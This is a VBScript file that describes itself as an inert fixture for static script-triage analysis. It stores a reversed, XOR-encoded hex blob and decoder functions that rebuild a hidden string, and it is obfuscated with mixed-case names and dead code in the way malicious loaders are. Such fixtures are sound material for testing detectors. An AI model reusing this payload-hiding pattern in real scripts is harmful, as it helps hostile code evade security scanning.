Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_d93a26ac = "60:96:a5:bf:42:60:9d:ac:e2:46:2a:cc:fd:cb:02:76:cb:ee:f3:1f:70:e6:a1:f3:1f:60:c9:fd:d8:03:60:dd:e9:fb:05:64:ca:b2:e1:42:61:9c:ac:b1:46:3d:81:f8:ee:1d:64:d8:f2:ee:5f:60:c2:ec:ea:10:7d:cb:b2:e2:49:3c:96:af:e2:42:35:cb:ab:a8:5e:3f:dd:ec:f3:05:6d:93:f0:f5:04:79:cb:a4:be:49:36:cb:af:b7:14:32:83:f2:e0:18:64:de:f1:e6:12:38:ca:f5:d8:1f:62:c7:fd:f7:1c:64:cd:e0:b5:4c:71:c0:e9:e8:12:5a:cb:fb:e6:05:76:d2:cc:d3:25:4d:e2:d1:df:5f:71:c8:f3:f4:1e:77:cd:f5:ca:4c:77:cb:e8:f7:10:61:cf:e0:fe:03:6a:c3:f9:ea:2e:6d:cd:e8:e6:01:76:c7:f8:ab:14:71:c1:f1:e2:03:5a:cb:ee:ee:04:74:cd:fd:ba:02:75:cb:e8:f4:0d:34:93:ea"
Const Codec_d93a26ac = "reversed_hex|repeating_key_xor|9c,ae,05,71,87"

Function Load_d93a26ac()
  Dim parts, result(), ByTeInDeX
  parts = Split(Material_d93a26ac, ":")
  ReDim result(UBound(parts))
  For ByTeInDeX = 0 To UBound(parts)
    result(UBound(parts) - ByTeInDeX) = CInt("&H" & parts(ByTeInDeX))
  Next
  Load_d93a26ac = result
End Function

Function Decode_d93a26ac(ByRef SoUrCeByTeS)
  Dim result(), ByTeInDeX, keyBytes, previous
  ReDim result(UBound(SoUrCeByTeS))
  keyBytes = Array(156,174,5,113,135)
  For ByTeInDeX = 0 To UBound(SoUrCeByTeS)
    result(ByTeInDeX) = SoUrCeByTeS(ByTeInDeX) Xor keyBytes(ByTeInDeX Mod 5)
  Next
  Decode_d93a26ac = result
End Function

Function Recover_d93a26ac()
  Dim SoUrCeByTeS, DeCoDeDByTeS, DeScRiPtOrTeXt, NeUtRaL, ByTeInDeX, PaSs, ErRoRnUmBeR, ErRoRdEsCrIpTiOn
  ' configuration reconstruction
NeUtRaL = UBound(Array(3, 5, 8, 13))
  SoUrCeByTeS = Load_d93a26ac()
  Do
    DeCoDeDByTeS = Decode_d93a26ac(SoUrCeByTeS)
    Exit Do
  Loop
  DeScRiPtOrTeXt = ""
  For ByTeInDeX = 0 To UBound(DeCoDeDByTeS)
    DeScRiPtOrTeXt = DeScRiPtOrTeXt & Chr(DeCoDeDByTeS(ByTeInDeX))
  Next
' reconstruction complete
  Recover_d93a26ac = DeScRiPtOrTeXt
End Function

Function Inspect_d93a26ac()
  Inspect_d93a26ac = Recover_d93a26ac()
End Function
